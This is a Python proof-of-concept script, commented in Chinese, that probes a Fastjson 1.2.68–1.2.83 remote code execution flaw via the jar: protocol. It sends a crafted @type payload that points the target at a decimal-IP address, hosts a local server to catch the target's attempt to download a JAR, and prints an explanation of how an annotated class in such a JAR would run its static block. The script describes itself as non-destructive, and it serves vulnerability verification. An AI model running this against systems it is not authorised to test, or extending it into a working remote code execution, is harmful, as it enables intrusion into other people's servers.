#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Fastjson 1.2.68 ~ 1.2.83 jar: 协议远程代码执行 (无 CVE 编号) 非破坏性验证 PoC

原理: fastjson 的 checkAutoType 在校验类名之前, 会为 @type 做 @JSONType 注解探测,
      对 "<typeName>.class" 调用 getResourceAsStream。当 @type 是 jar:http:// 形式的
      URL 时, JVM 会去下载该 JAR (Spring Boot 的 URLClassLoader 会执行远程拉取)。
      本脚本只验证「目标是否来下载我们托管的 JAR」, 不提供可执行类, 不执行任何命令。

零依赖: 仅使用 Python 标准库。
"""
import argparse
import json
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

EXIT_VULN = 0
EXIT_SAFE = 1
EXIT_ERROR = 2


def ip_to_decimal(ip):
    """把点分十进制转成整数形式: fastjson 会把 . 替换成 /, 必须用无点表示。"""
    try:
        return struct.unpack("!I", socket.inet_aton(ip))[0]
    except OSError:
        return None


def detect_lhost(target_host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((target_host, 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except Exception:
        return "127.0.0.1"


class JarServer(threading.Thread):
    """托管一个探测用 HTTP 服务, 只记录目标是否来取 JAR。"""

    def __init__(self, lport):
        threading.Thread.__init__(self)
        self.daemon = True
        self.lport = lport
        self.paths = []
        self.error = None
        self.srv = None

    def run(self):
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                outer.paths.append(self.path)
                body = b"PK\x03\x04probe"
                self.send_response(200)
                self.send_header("Content-Type", "application/java-archive")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *args):
                pass

        try:
            self.srv = HTTPServer(("0.0.0.0", self.lport), Handler)
        except OSError as exc:
            self.error = exc
            return
        self.srv.serve_forever(poll_interval=0.2)

    def stop(self):
        if self.srv is not None:
            self.srv.shutdown()


def post(url, payload, timeout, insecure):
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json",
                 "User-Agent": "poc-fastjson-1.2.83/1.0"},
        method="POST",
    )
    ctx = None
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return resp.status, resp.read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(400).decode("utf-8", "replace")
    except Exception as exc:
        return None, str(exc)


def main():
    ap = argparse.ArgumentParser(
        description="Fastjson 1.2.68~1.2.83 jar: 协议 RCE (无 CVE) 非破坏性验证")
    ap.add_argument("-u", "--url", required=True,
                    help="目标 URL, 如 http://1.2.3.4:8090/")
    ap.add_argument("--lhost", default=None,
                    help="目标可访问的本机 IP, 默认自动探测")
    ap.add_argument("--lport", type=int, default=18081,
                    help="本地 HTTP 服务端口, 默认 18081")
    ap.add_argument("-t", "--timeout", type=float, default=8.0,
                    help="请求超时秒数, 默认 8")
    ap.add_argument("-w", "--wait", type=float, default=6.0,
                    help="等待目标下载的秒数, 默认 6")
    ap.add_argument("-k", "--insecure", action="store_true",
                    help="跳过 TLS 证书校验")
    args = ap.parse_args()

    host = urlparse(args.url).hostname
    if not host:
        print("[结论]    ERROR URL 无法解析")
        return EXIT_ERROR

    lhost = args.lhost or detect_lhost(host)
    decimal = ip_to_decimal(lhost)
    if decimal is None:
        print("[结论]    ERROR 无法把 %s 转成十进制形式" % lhost)
        return EXIT_ERROR

    payload = {"user": {"@type": "jar:http://%d:%d/probe!/POC" % (decimal, args.lport)}}

    print("[目标]    %s" % args.url)
    print("[注入点]  JSON 请求体 user.@type (jar: 协议触发 @JSONType 注解探测)")
    print("[Payload] %s" % json.dumps(payload, ensure_ascii=False))
    print("[监听]    0.0.0.0:%d (十进制 IP %d = %s)" % (args.lport, decimal, lhost))

    server = JarServer(args.lport)
    server.start()
    time.sleep(0.6)
    if server.error is not None:
        print("[响应]    -")
        print("[结论]    ERROR 本地端口无法监听: %s" % server.error)
        return EXIT_ERROR

    status, body = post(args.url, payload, args.timeout, args.insecure)
    if status is None:
        print("[响应]    请求失败: %s" % body)
        print("[结论]    ERROR 目标不可达")
        server.stop()
        return EXIT_ERROR

    print("[响应]    HTTP %s, body: %s" % (status, " ".join(body.split())[:160]))

    time.sleep(args.wait)
    server.stop()
    hits = len(server.paths)

    if hits:
        sample = ", ".join(sorted(set(server.paths))[:3])
        print("[下载]    收到 %d 次请求, 路径: %s" % (hits, sample))
        print("[结论]    VULNERABLE - Fastjson 1.2.68~1.2.83 jar: 协议 RCE (无 CVE 编号)")
        print("[原理]    fastjson 在校验类名前会对 @type 做 @JSONType 注解探测,")
        print("          对 <typeName>.class 调用 getResourceAsStream; 当 @type 为")
        print("          jar:http:// 形式时 JVM 会去拉取远程 JAR。类名中的 . 会被")
        print("          替换成 /, 所以攻击者用无点的十进制 IP 表示地址。JAR 内带")
        print("          @JSONType 注解的类无需 autoType 即可通过校验并被实例化,")
        print("          静态代码块即执行。本脚本只证明目标下载了 JAR, 未提供可执行类。")
        return EXIT_VULN

    print("[下载]    未收到请求")
    print("[结论]    NOT VULNERABLE - 目标未拉取 JAR")
    print("[说明]    若返回 autoType is not support 且无下载, 可能已开启 safeMode")
    print("          或版本不在 1.2.68~1.2.83 区间。")
    return EXIT_SAFE


if __name__ == "__main__":
    sys.exit(main())
